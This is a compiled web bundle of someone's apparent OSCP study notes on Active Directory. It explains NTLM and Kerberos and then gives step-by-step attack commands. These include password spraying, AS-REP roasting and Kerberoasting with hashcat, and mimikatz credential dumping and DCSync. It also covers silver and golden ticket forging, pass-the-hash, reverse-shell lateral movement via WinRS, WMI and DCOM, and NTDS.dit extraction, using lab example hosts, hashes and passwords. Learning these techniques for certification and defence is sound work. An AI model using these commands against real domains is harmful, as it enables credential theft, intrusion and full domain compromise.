"use strict";(globalThis.webpackChunkportfolio=globalThis.webpackChunkportfolio||[]).push([[1164],{1026:(e,s,r)=>{r.r(s),r.d(s,{assets:()=>c,contentTitle:()=>a,default:()=>l,frontMatter:()=>o,metadata:()=>n,toc:()=>d});const n=JSON.parse('{"id":"general/AD","title":"AD","description":"Active Directory (AD) is a service that allow admins to manage collections of machines at the same time. Each domain is managed by a central machine known as the domain controller (DC).","source":"@site/docs/general/AD.md","sourceDirName":"general","slug":"/general/AD","permalink":"/portfolio/docs/general/AD","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedAt":1765122676000,"frontMatter":{},"sidebar":"docsSidebar","previous":{"title":"General","permalink":"/portfolio/docs/category/general"},"next":{"title":"Backgrounding","permalink":"/portfolio/docs/general/Backgrounding"}}');var t=r(4848),i=r(8453);const o={},a=void 0,c={},d=[{value:"Core concepts",id:"core-concepts",level:2},{value:"LDAP",id:"ldap",level:3},{value:"Distinguished Name",id:"distinguished-name",level:3},{value:"NTLM Auth Steps",id:"ntlm-auth-steps",level:3},{value:"Kerberos Auth Steps",id:"kerberos-auth-steps",level:3},{value:"AD permissions",id:"ad-permissions",level:3},{value:"Default Users",id:"default-users",level:3},{value:"Miscellaneous",id:"miscellaneous",level:3},{value:"Enumeration",id:"enumeration",level:2},{value:"Exploit Methods",id:"exploit-methods",level:2},{value:"Spray Passwords",id:"spray-passwords",level:3},{value:"AS-REP Roasting (cracking user pw)",id:"as-rep-roasting-cracking-user-pw",level:3},{value:"Kerberoasting (cracking service/SPN pw)",id:"kerberoasting-cracking-servicespn-pw",level:3},{value:"Silver Ticket (forge TGS to access services)",id:"silver-ticket-forge-tgs-to-access-services",level:3},{value:"Domain Backup Abuse (get NTLM of other users)",id:"domain-backup-abuse-get-ntlm-of-other-users",level:3},{value:"Pass the Hash (login if u have NTLM)",id:"pass-the-hash-login-if-u-have-ntlm",level:3},{value:"Lateral Movement",id:"lateral-movement",level:2},{value:"WinRS",id:"winrs",level:3},{value:"Powershell methods",id:"powershell-methods",level:3},{value:"PsExec",id:"psexec",level:3},{value:"Overpass the Hash",id:"overpass-the-hash",level:3},{value:"Pass the Ticket",id:"pass-the-ticket",level:3},{value:"DCOM",id:"dcom",level:3},{value:"Golden Ticket",id:"golden-ticket",level:3},{value:"Shadow Copies",id:"shadow-copies",level:3}];function h(e){const s={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",ul:"ul",...(0,i.R)(),...e.components},{Details:n}=s;return n||function(e,s){throw new Error("Expected "+(s?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.p,{children:"Active Directory (AD) is a service that allow admins to manage collections of machines at the same time. Each domain is managed by a central machine known as the domain controller (DC)."}),"\n",(0,t.jsxs)(s.p,{children:["With sufficient perms, u can just change another user\u2019s pw using ",(0,t.jsx)(s.code,{children:"net user <user> <new pw> /domain"})]}),"\n",(0,t.jsx)(s.h2,{id:"core-concepts",children:"Core concepts"}),"\n",(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"powerful groups: Domain Admins, Enterprise Admins"}),(0,t.jsx)(s.h3,{id:"ldap",children:"LDAP"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"When we query user or group objects, LDAP is used as the communication channel for the query."}),(0,t.jsx)(s.p,{children:(0,t.jsx)(s.code,{children:"LDAP://HostName[:PortNumber][/DistinguishedName]"})}),(0,t.jsx)(s.p,{children:"Hostname: hostname(computer name / IP / domain name) of DC holding the\xa0PdcRoleOwner\xa0property"}),(0,t.jsx)(s.p,{children:"(optional) Port: for DC using non-default ports"}),(0,t.jsxs)(s.p,{children:["(optional) Distinguished Name: ",(0,t.jsx)(s.a,{href:"/docs/general/AD#distinguished-name",children:"here"})]})]}),(0,t.jsx)(s.h3,{id:"distinguished-name",children:"Distinguished Name"}),(0,t.jsx)(n,{children:(0,t.jsxs)(s.p,{children:["Every object has a DN, leftmost is highest hierarchy (like parent or smth) and rightmost is lowest hierarchy. Eg, ",(0,t.jsx)(s.code,{children:"CN=Stephanie,CN=Users,DC=corp,DC=com"})," is a DN for the user Stephanie, as u can see the hierarchy goes from left to right"]})}),(0,t.jsx)(s.h3,{id:"ntlm-auth-steps",children:"NTLM Auth Steps"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname), or if the user attempts to authenticate to a hostname that is not registered on the Active Directory-integrated DNS server. Likewise, third-party applications may choose to use NTLM authentication instead of Kerberos."}),(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"NTLM Auth Steps",src:r(2682).A+"",width:"944",height:"839"})}),(0,t.jsx)(s.p,{children:"Step 4 response is encrypted using the hash from step 1. DC already knows NTLM hash of all users."})]}),(0,t.jsx)(s.h3,{id:"kerberos-auth-steps",children:"Kerberos Auth Steps"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Default authentication mechanism for modern AD. Kerberos stores cached hashes in LSASS. Mimikatz is a tool that helps to extract stuff from LSASS."}),(0,t.jsx)(s.p,{children:(0,t.jsx)(s.img,{alt:"Kerberos Auth Steps",src:r(3702).A+"",width:"942",height:"836"})}),(0,t.jsx)(s.p,{children:"Step 1 (AS-REQ) (also known as preauthentication): Timestamp encrypted using a hash dervied from the user's password"}),(0,t.jsx)(s.p,{children:"DC knows the hashes for all users, and decrypts the AS-REQ, checks that the timestamp is valid."}),(0,t.jsx)(s.p,{children:"Step 2 (AS-REP): If valid, AS-REP will contain a session key (encrypted using the password hash) and ticket-granting ticket (TGT) (encrypted using krbtgt's hash). By default TGTs are valid for 10h."}),(0,t.jsx)(s.p,{children:"When user wants to use a service, DC will be contacted again, initiating Step 3."}),(0,t.jsx)(s.p,{children:"Step 3 (TGS-REQ): {user + timestamp} (encrypted with session key), resource name, and encrypted TGT."}),(0,t.jsx)(s.p,{children:"DC checks: Timestamp must be valid, username encrypted with session key must match TGT, source IP has to match TGT, then TGS-REP is sent"}),(0,t.jsx)(s.p,{children:"Step 4 (TGS-REP): name of service granted (encrypted with session key from step 2), new session key (encrypted with session key from step 2), service ticket (known as TGS) with username, groups, and new session key (service ticket/TGS is encrypted with password hash of service account)."}),(0,t.jsx)(s.p,{children:"User will then continue auth with the actual service."}),(0,t.jsx)(s.p,{children:"Step 5 (AP-REQ): username & timestamp (encrypted with new session key from step 4), and TGS"}),(0,t.jsx)(s.p,{children:"Application server decrypts the TGS to get username, and checks if it matches username from the other part of AP-REQ. Then it will check the groups listed in the TGS and assign the user the appropriate perms and then send AP-REP."}),(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962",children:"Privileged Account Certificate"})," (PAC) ",(0,t.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-apds/1d1f2b0c-8e8a-4d2a-8665-508d04976f84",children:"validation"})," is an optional verification process between the SPN application and the domain controller. If this is enabled, the user authenticating to the service and its privileges are validated by the domain controller."]}),(0,t.jsxs)(s.p,{children:["[WIP] read and add info from this ",(0,t.jsx)(s.a,{href:"https://blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf",children:"link"})," about the hash that Kerberos uses in Step 1"]})]}),(0,t.jsx)(s.h3,{id:"ad-permissions",children:"AD permissions"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"[Highest] GenericAll: Full permissions on object"}),(0,t.jsx)(s.p,{children:"GenericWrite: Edit certain attributes on the object"}),(0,t.jsx)(s.p,{children:"WriteOwner: Change ownership of the object"}),(0,t.jsx)(s.p,{children:"WriteDACL: Edit ACE's applied to object"}),(0,t.jsx)(s.p,{children:"AllExtendedRights: Change password, reset password, etc."}),(0,t.jsx)(s.p,{children:"ForceChangePassword: Password change for object"}),(0,t.jsx)(s.p,{children:"Self (Self-Membership): Add ourselves to for example a group"}),(0,t.jsxs)(s.p,{children:["(more\u2026)[",(0,t.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks",children:"https://learn.microsoft.com/en-us/windows/win32/secauthz/access-rights-and-access-masks"}),"]"]})]}),(0,t.jsx)(s.h3,{id:"default-users",children:"Default Users"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Administrator, Krbtgt, Guest, some super long SID"}),(0,t.jsx)(s.p,{children:"(so that when enumerating u can note down the non-default users maybe idk)"})]}),(0,t.jsx)(s.h3,{id:"miscellaneous",children:"Miscellaneous"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:(0,t.jsx)(s.a,{href:"https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices?view=windowsdesktop-9.0",children:"https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices?view=windowsdesktop-9.0"})}),(0,t.jsx)(s.p,{children:"DirectoryEntry\xa0class encapsulates an AD object"}),(0,t.jsx)(n,{children:(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-powershell",children:"$PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name\r\n$DN = ([adsi]'').distinguishedName\r\n$LDAP = \"LDAP://$PDC/$DN\"\r\n\r\n$direntry = New-Object System.DirectoryServices.DirectoryEntry($LDAP)\n"})})}),(0,t.jsx)(s.p,{children:"DirectorySearcher\xa0class performs queries against AD"}),(0,t.jsx)(n,{children:(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-powershell",children:'$dirsearcher = New-Object System.DirectoryServices.DirectorySearcher($direntry)\r\n$dirsearcher.filter="samAccountType=805306368" #Users\r\n$dirsearcher.FindAll()\n'})})})]})]}),"\n",(0,t.jsx)(s.h2,{id:"enumeration",children:"Enumeration"}),"\n",(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"If can upload stuff"}),(0,t.jsxs)(n,{children:[(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.a,{href:"/docs/general/Download%20&%20Upload",children:"Upload"})," mimikatz.exe and SharpHound.ps1"]}),(0,t.jsx)(s.p,{children:"Bloodhound/sharphound: [WIP]"}),(0,t.jsxs)(s.p,{children:["Mimikatz: ",(0,t.jsx)(s.code,{children:"privilege::debug"})," first, then ",(0,t.jsx)(s.code,{children:"sekurlsa::logonpasswords"})," for NTLM hash, ",(0,t.jsx)(s.code,{children:"sekurlsa::tickets /export"})," for tickets. ",(0,t.jsx)(s.code,{children:"log"})," to save output to file (for easier searching)"]})]})]}),"\n",(0,t.jsx)(s.h2,{id:"exploit-methods",children:"Exploit Methods"}),"\n",(0,t.jsxs)(n,{children:[(0,t.jsx)(s.h3,{id:"spray-passwords",children:"Spray Passwords"}),(0,t.jsxs)(n,{children:[(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.code,{children:"net accounts"})," to check lockout threshold and duration. observation window is the time the threshold will reset. window of 30 mins with threshold of 5 means that u can safely submit 4 wrong attempts every 30 minutes without lockout."]}),(0,t.jsxs)(s.ol,{children:["\n",(0,t.jsxs)(s.li,{children:["causes a lot more traffic: on kali - ",(0,t.jsx)(s.code,{children:"crackmapexec smb <target ip> -u <wordlist> -p '<pw>' -d <domain name like corp.com> --continue-on-success"})," . displays (Pwn3d!) at the end if user cracked is an admin"]}),"\n",(0,t.jsxs)(s.li,{children:["if u have rdp session: copy Spray-Passwords.ps1 over to machine, then run ",(0,t.jsx)(s.code,{children:".\\Spray-Passwords.ps1 -Pass <pw> -Admin"})," where -Admin will spray it against all domain admins"]}),"\n",(0,t.jsxs)(s.li,{children:["if u have rdp session: copy kerbrute_windows_amd64.exe over to machine, then run ",(0,t.jsx)(s.code,{children:'.\\kerbrute_windows_amd64.exe passwordspray -d <domain name like corp.com> .\\usernames.txt "<pw>\u201d'})," where -Admin will spray it against all domain admins"]}),"\n"]})]}),(0,t.jsx)(s.h3,{id:"as-rep-roasting-cracking-user-pw",children:"AS-REP Roasting (cracking user pw)"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires: 'Do not require Kerberos preauthentication' is set to 'enabled'."}),(0,t.jsxs)(s.p,{children:["Run ",(0,t.jsx)(s.code,{children:"impacket-GetNPUsers -dc-ip <domain controller ip>  -request -outputfile hashes.asreproast <domain>/<user>"})," (eg ",(0,t.jsx)(s.code,{children:"impacket-GetNPUsers -dc-ip <domain controller ip> -request -outputfile hashes.asreproast corp.com/<user>"}),"). Then run ",(0,t.jsx)(s.code,{children:'hashcat --help | grep -i "Kerberos"'})," and find the AS-REP mode for hashcat (it should be 18200, if not change the mode in the next command), then run ",(0,t.jsx)(s.code,{children:"sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]}),(0,t.jsx)(s.p,{children:"When preauthentication is not enabled, we can just send username over without any encrypted timestamp and the DC will give u the AS-REP. If u can crack the AS-REP u can get the user's password."})]}),(0,t.jsx)(s.h3,{id:"kerberoasting-cracking-servicespn-pw",children:"Kerberoasting (cracking service/SPN pw)"}),(0,t.jsxs)(n,{children:[(0,t.jsxs)(s.p,{children:["The TGS from Step 4 of ",(0,t.jsx)(s.a,{href:"/docs/general/AD#kerberos-auth-steps",children:"Kerberos Auth"})," is encrypted using the SPN's password hash. If we can request the ticket and decrypt it using brute force or guessing, we can use this information to crack the cleartext password of the service account. This technique is known as\xa0",(0,t.jsx)(s.a,{href:"https://blog.harmj0y.net/redteaming/kerberoasting-revisited/",children:"Kerberoasting"}),"."]}),(0,t.jsxs)(s.p,{children:["Powershell: ",(0,t.jsx)(s.code,{children:".\\Rubeus.exe kerberoast /outfile:hashes.kerberoast"})]}),(0,t.jsxs)(s.p,{children:["Linux: ",(0,t.jsx)(s.code,{children:"sudo impacket-GetUserSPNs -request -dc-ip <domain controller ip> <domain>/<user>"})," must use a known user and pssword, then ",(0,t.jsx)(s.code,{children:"sudo hashcat -m 13100 <hash file> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]}),(0,t.jsxs)(s.p,{children:["If you have GenericAll or GenericWrite on a user, u can set an\xa0",(0,t.jsx)(s.a,{href:"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)",children:"SPN for the user"}),", kerberoast the account, and crack the password hash"]})]}),(0,t.jsx)(s.h3,{id:"silver-ticket-forge-tgs-to-access-services",children:"Silver Ticket (forge TGS to access services)"}),(0,t.jsxs)(n,{children:[(0,t.jsxs)(s.p,{children:["Requires: Privileged Account Certificate (PAC) validation is disabled (quite common), and possession of service account password/hash (can obtain via ",(0,t.jsx)(s.a,{href:"/docs/general/AD#kerberoasting-cracking-servicespn-pw",children:"kerberoasting"}),")"]}),(0,t.jsxs)(s.p,{children:["With hash of service account, u can forge a TGS from step 4 of ",(0,t.jsx)(s.a,{href:"/docs/general/AD#kerberos-auth-steps",children:"kerberos auth"}),"."]}),(0,t.jsx)(s.p,{children:"We need three things:"}),(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsxs)(s.li,{children:["SPN password hash: run mimikatz and then ",(0,t.jsx)(s.code,{children:"privilege::debug"})," and ",(0,t.jsx)(s.code,{children:"sekurlsa::logonpasswords"})," and look for the service account entry and take the NTML hash"]}),"\n",(0,t.jsx)(s.li,{children:"Domain SID: in the same output take the part of the SID before the last dash"}),"\n",(0,t.jsxs)(s.li,{children:["Target SPN (eg ",(0,t.jsx)(s.code,{children:"HTTP/web04.corp.com"}),")"]}),"\n"]}),(0,t.jsxs)(s.p,{children:["then u can run ",(0,t.jsx)(s.code,{children:"kerberos::golden /sid:<domain sid> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:<ntlm hash> /user:<user>"})," u can choose any user, preferably the user ur currently accessing so u can access that service using that ticket"]}),(0,t.jsxs)(s.p,{children:["[only for specific web04 example] use ",(0,t.jsx)(s.code,{children:"iwr -UseDefaultCredentials http://web04/"})," (response should be 200) or ",(0,t.jsx)(s.code,{children:"klist"})," to confirm success (cached ticket should have 1 for ur requested server)"]})]}),(0,t.jsx)(s.h3,{id:"domain-backup-abuse-get-ntlm-of-other-users",children:"Domain Backup Abuse (get NTLM of other users)"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires: Replicating Directory Changes,\xa0Replicating Directory Changes All, and\xa0Replicating Directory Changes in Filtered Set\xa0rights (shown in Bloodhound). By default, members of the\xa0Domain Admins,\xa0Enterprise Admins, and\xa0Administrators\xa0groups have these rights assigned."}),(0,t.jsxs)(s.p,{children:["(Req shell access) You can obtain the ntlm hash for any user using mimikatz: ",(0,t.jsx)(s.code,{children:"lsadump::dcsync /user:<user>"}),"  then copy the NTLM hash and store it in a file named\xa0hashes.dcsync on kali, then ",(0,t.jsx)(s.code,{children:"hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force"})]}),(0,t.jsxs)(s.p,{children:["(Req plaintext password) or you can do it in linux: ",(0,t.jsx)(s.code,{children:"impacket-secretsdump -just-dc-user <target user> <domain>/<user w perms>:<password>@<ip**>**"})," (eg ",(0,t.jsx)(s.code,{children:'impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\\!"@192.168.50.70'}),")"]}),(0,t.jsxs)(s.p,{children:["the NTLM hash can be found in the section showed here:\r\n",(0,t.jsx)(s.img,{alt:"Screenshot of impacket-secretsdump output",src:r(9415).A+"",width:"915",height:"385"})]})]}),(0,t.jsx)(s.h3,{id:"pass-the-hash-login-if-u-have-ntlm",children:"Pass the Hash (login if u have NTLM)"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires (all conditions rather common):"}),(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsx)(s.li,{children:"only NTLM auth is used"}),"\n",(0,t.jsx)(s.li,{children:"NTLM hash of a user on the machine"}),"\n",(0,t.jsx)(s.li,{children:"SMB connection through the firewall (commonly port 445)"}),"\n",(0,t.jsx)(s.li,{children:"ADMIN$\xa0share must be available, and File and Printer Sharing has to be turned on (default settings)"}),"\n"]}),(0,t.jsx)(s.p,{children:"However, u usually also require local admin rights on target machine."}),(0,t.jsxs)(s.p,{children:["run this on kali:  ",(0,t.jsx)(s.code,{children:"/usr/bin/impacket-wmiexec -hashes :<compromised hash> <compromised user>@<victim ip>"})," (eg ",(0,t.jsx)(s.code,{children:"/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73"})," )"]})]}),(0,t.jsx)(s.h2,{id:"lateral-movement",children:"Lateral Movement"}),(0,t.jsxs)(s.p,{children:["Try another method if one of the method doesn\u2019t work\u2026sometimes some method works but some dont\u2026idk also\r\nFor contents of encode.py refer ",(0,t.jsx)(s.a,{href:"/docs/appendix/encode-py",children:"here"})]}),(0,t.jsx)(s.h3,{id:"winrs",children:"WinRS"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires: current user is part of Remote Management Users group on target machine"}),(0,t.jsxs)(s.p,{children:["Replace the IP address in ",(0,t.jsx)(s.code,{children:"encode.py"})," then ",(0,t.jsx)(s.code,{children:"python3 encode.py"})," and copy the output. The, run ",(0,t.jsx)(s.code,{children:"nc -nvlp 443"})]}),(0,t.jsxs)(s.p,{children:["On the victim machine on cmd: ",(0,t.jsx)(s.code,{children:'winrs -r:<client name like files04> -u:<user> -p:<pw>  "<output>"'})]})]}),(0,t.jsx)(s.h3,{id:"powershell-methods",children:"Powershell methods"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires: current user is a Local Admin on target client"}),(0,t.jsxs)(s.p,{children:["Replace the IP address in ",(0,t.jsx)(s.code,{children:"encode.py"})," then ",(0,t.jsx)(s.code,{children:"python3 encode.py"})," and copy the output. The, run ",(0,t.jsx)(s.code,{children:"nc -nvlp 443"})]}),(0,t.jsx)(s.p,{children:"Run them line by line in powershell on the victim. Don't forget to change the user, password and/or paste the output!"}),(0,t.jsx)(s.p,{children:"Option 1:"}),(0,t.jsx)(n,{children:(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-powershell",children:"$username = '<user>';\r\n$password = '<pw>';\r\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\r\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\r\n$options = New-CimSessionOption -Protocol DCOM\r\n$session = New-Cimsession -ComputerName <target ip> -Credential $credential -SessionOption $Options \r\n$command = '<output>';\r\nInvoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};\n"})})}),(0,t.jsx)(s.p,{children:"Option 2:"}),(0,t.jsx)(n,{children:(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-powershell",children:"$username = '<user>';\r\n$password = '<pw>';\r\n$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;\r\n$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;\r\nNew-PSSession -ComputerName <target ip> -Credential $credential\r\nEnter-PSSession <id> # Get id from the output of the previous command\n"})})})]}),(0,t.jsx)(s.h3,{id:"psexec",children:"PsExec"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires:"}),(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsx)(s.li,{children:"user and pw of a local admin on the target client (can try to crack the pw by bruteforcing NTLM or other hashes found)"}),"\n",(0,t.jsx)(s.li,{children:"ADMIN$\xa0share must be available, and File and Printer Sharing has to be turned on (default settings)"}),"\n"]}),(0,t.jsxs)(s.p,{children:["copy PsExec64 from kali (in desktop/cybertools/sysinternals) ",(0,t.jsx)(s.code,{children:".\\PsExec64.exe -i  \\\\<client name like FILES04> -u corp\\<user> -p <pw> <cmd or other process u wanna start>"})," (eg ",(0,t.jsx)(s.code,{children:".\\PsExec64.exe -i  \\\\FILES04 -u corp\\jen -p Nexus123! cmd"}),")"]})]}),(0,t.jsx)(s.h3,{id:"overpass-the-hash",children:"Overpass the Hash"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires:"}),(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsx)(s.li,{children:"an NTLM hash"}),"\n"]}),(0,t.jsxs)(s.p,{children:["in mimikatz: ",(0,t.jsx)(s.code,{children:"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell"})," (eg ",(0,t.jsx)(s.code,{children:"sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell"}),"). then, start a service as that user (like ",(0,t.jsx)(s.code,{children:"net use \\\\files04"}),") and then u can do ",(0,t.jsx)(s.code,{children:"C:\\tools\\SysinternalsSuite\\PsExec.exe \\\\files04 cmd"})," to gain code execution as that user thru TGT instead of NTLM"]}),(0,t.jsx)(s.p,{children:"Basicly mimikatz helps to do the whole Kerberos auth process using NTLM."})]}),(0,t.jsx)(s.h3,{id:"pass-the-ticket",children:"Pass the Ticket"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires: There should be a user on a service that you have identified that you want to compromise. Or maybe u just export all the tickets and check if each of them work and what u can access idk"}),(0,t.jsxs)(s.p,{children:["run ",(0,t.jsx)(s.code,{children:"privilege::debug"})," then ",(0,t.jsx)(s.code,{children:"sekurlsa::tickets /export"})," in mimikatz, then look at the generated kirbi files to find an appropriate user + service that u wanna target. once found, ",(0,t.jsx)(s.code,{children:"kerberos::ptt <filename>.kirbi"}),". it should return a \u2018File: smth smth: OK\u2019 and when u run ",(0,t.jsx)(s.code,{children:"klist"})," in powershell it should show a ticket from the target user (under client) on the target service (under server). then u can just use the service like ",(0,t.jsx)(s.code,{children:"ls \\\\web04\\<shared folder>"})," or smth"]}),(0,t.jsx)(s.p,{children:"Mimikatz extracts the stored TGSes and can import them to our current user to give us perms"})]}),(0,t.jsx)(s.h3,{id:"dcom",children:"DCOM"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires: current user to have an account on target machine"}),(0,t.jsxs)(s.p,{children:["In powershell: ",(0,t.jsx)(s.code,{children:'$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<target ip>"))'})," then replace the IP address in ",(0,t.jsx)(s.code,{children:"encode.py"})," then ",(0,t.jsx)(s.code,{children:"python3 encode.py"})," and copy the output. The, run ",(0,t.jsx)(s.code,{children:"nc -nvlp 443"})," to generate the encoded string and use the following command:\r\n",(0,t.jsx)(s.code,{children:'$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"<python output>","7")'})]})]}),(0,t.jsx)(s.h3,{id:"golden-ticket",children:"Golden Ticket"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires: Either krbtgt NTLM hash or admin perms on DC machine"}),(0,t.jsxs)(s.p,{children:["If you have admin perms on DC machine, run mimikatz on the DC, then ",(0,t.jsx)(s.code,{children:"privilege::debug"})," and ",(0,t.jsx)(s.code,{children:"lsadump::lsa patch"})," then search for krbtgt and get the ntlm hash."]}),(0,t.jsxs)(s.p,{children:["then get the domain sid (basically the whole thing until just before the last dash) using ",(0,t.jsx)(s.code,{children:"whoami /user"})," then do ",(0,t.jsx)(s.code,{children:"kerberos::purge"})," and ",(0,t.jsx)(s.code,{children:"kerberos::golden /user:<user> /domain:<domain> /sid:<sid> /krbtgt:<ntlm hash> /ptt"})," (eg ",(0,t.jsx)(s.code,{children:"kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt"}),") then do ",(0,t.jsx)(s.code,{children:"misc::cmd"})," to launch cmd, then ",(0,t.jsx)(s.code,{children:"PsExec.exe \\\\dc1 cmd.exe"})," . However, PsExec with the ip address instead of \\dc1 would force ntlm auth and fail."]})]}),(0,t.jsx)(s.h3,{id:"shadow-copies",children:"Shadow Copies"}),(0,t.jsx)(s.p,{children:"pure persistence, i think no need for OSCP cuz it requires u to have domain admin on DC"}),(0,t.jsxs)(n,{children:[(0,t.jsx)(s.p,{children:"Requires: Domain admin on DC"}),(0,t.jsxs)(s.p,{children:["on dc as domain admin: ",(0,t.jsx)(s.code,{children:"vshadow.exe -nw -p  C:"}),", take note of 'shadow copy device name'. then ",(0,t.jsx)(s.code,{children:"copy <shadow copy device name>\\windows\\ntds\\ntds.dit c:\\ntds.dit.bak"})," and ",(0,t.jsx)(s.code,{children:"reg.exe save hklm\\system c:\\system.bak"}),". transfer files to kali, then on kali, ",(0,t.jsx)(s.code,{children:"impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL"}),". it should print out all the hashes then u save somewhere"]})]})]})]})}function l(e={}){const{wrapper:s}={...(0,i.R)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(h,{...e})}):h(e)}},2682:(e,s,r)=>{r.d(s,{A:()=>n});const n=r.p+"assets/images/NTLMauth-9a448fec46653ba44661a7c711975783.png"},3702:(e,s,r)=>{r.d(s,{A:()=>n});const n=r.p+"assets/images/KerberosAuth-6790e626e4a45dbfcd584dab1aff8735.png"},8453:(e,s,r)=>{r.d(s,{R:()=>o,x:()=>a});var n=r(6540);const t={},i=n.createContext(t);function o(e){const s=n.useContext(i);return n.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:o(e.components),n.createElement(i.Provider,{value:s},e.children)}},9415:(e,s,r)=>{r.d(s,{A:()=>n});const n=r.p+"assets/images/DomainBackupAbuse-da60f4aa406ca67db9ef5a7aad4bb015.png"}}]);